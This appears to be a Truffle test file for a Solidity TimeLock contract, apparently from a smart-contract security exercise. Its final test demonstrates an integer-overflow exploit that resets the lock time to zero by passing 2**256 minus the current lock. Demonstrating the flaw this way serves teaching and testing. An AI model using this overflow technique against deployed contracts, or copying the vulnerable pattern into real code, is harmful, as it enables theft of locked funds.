// Import all required modules from openzeppelin-test-helpers
const { BN, expectRevert } = require('@openzeppelin/test-helpers');

const TimeLock = artifacts.require("TimeLock");

// Using async/await
contract("TimeLock", () => {
    before(async () => {
        this.accounts = await web3.eth.getAccounts();
        this.tl = await TimeLock.new();
        // should be locked for 1 week
        await this.tl.deposit({ "value": 2 * web3.utils.unitMap.ether });
        // use getter
        this.time = await this.tl.lockTime(this.accounts[0]);
    });

    it("timelock later than now", async () => {
        let lastTimestamp = (await web3.eth.getBlock('latest')).timestamp;
        assert.isAbove(this.time.toNumber(), lastTimestamp);
    });

    it("timelock prevents withdrawal", async () => {
        await expectRevert(this.tl.withdraw(), "funds locked");
    });

    it("timelock can be exploited by overflow", async () => {
        // bignmumber = 2**256
        let bignumber = new BN("115792089237316195423570985008687907853269984665640564039457584007913129639936")
        // use getter
        bignumber = bignumber.sub(this.time);
        await this.tl.increaseLockTime(bignumber.toString());

        // check overflow
        let lockTime = await this.tl.lockTime(this.accounts[0]);
        assert.equal(lockTime.toNumber(), 0);
    });
});